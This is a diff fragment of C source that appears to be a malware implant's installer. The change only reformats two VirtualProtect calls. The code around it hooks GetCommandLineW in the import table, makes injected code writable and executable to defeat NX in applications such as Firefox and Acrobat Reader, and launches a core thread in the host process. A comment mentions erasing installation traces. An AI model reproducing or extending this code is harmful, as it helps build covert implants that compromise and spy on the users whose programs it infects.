@@ -623,7 +623,10 @@ NEXT_ENTRY:
 		if(pfn_GetCommandLineW)
 		{
 			pfn_HookCall(STRING(STRIDX_KERNEL32_DLL), STRING(STRIDX_GETCMDLINEW), (DWORD)pfn_GetCommandLineW, IAT_rva, imageBase, header);
-			pfn_VirtualProtect(pfn_GetCommandLineW, (ULONG)GetCommandLineWHook_End - (ULONG)GetCommandLineWHook, PAGE_EXECUTE_READWRITE, &oldProtect);
+			pfn_VirtualProtect(pfn_GetCommandLineW, 
+				(ULONG)GetCommandLineWHook_End - (ULONG)GetCommandLineWHook, 
+				PAGE_EXECUTE_READWRITE, 
+				&oldProtect);
 		}
 	}
 	//
@@ -633,7 +636,10 @@ NEXT_ENTRY:
 
 	if (pfn_CoreThreadProc) {
 		// handle apps that enforce NX at runtime(e.g firefox, acrobat reader)
-		pfn_VirtualProtect(pfn_CoreThreadProc, (UINT_PTR)CoreThreadProc_End - (UINT_PTR)CoreThreadProc, PAGE_EXECUTE_READWRITE, &oldProtect);
+		pfn_VirtualProtect(pfn_CoreThreadProc, 
+			(UINT_PTR)CoreThreadProc_End - (UINT_PTR)CoreThreadProc, 
+			PAGE_EXECUTE_READWRITE, 
+			&oldProtect);
 		pfn_CreateThread(NULL, 0, pfn_CoreThreadProc, header, 0, NULL);
 	} else {
 		// XXX installation of core failed, we should remove any traces of intallation
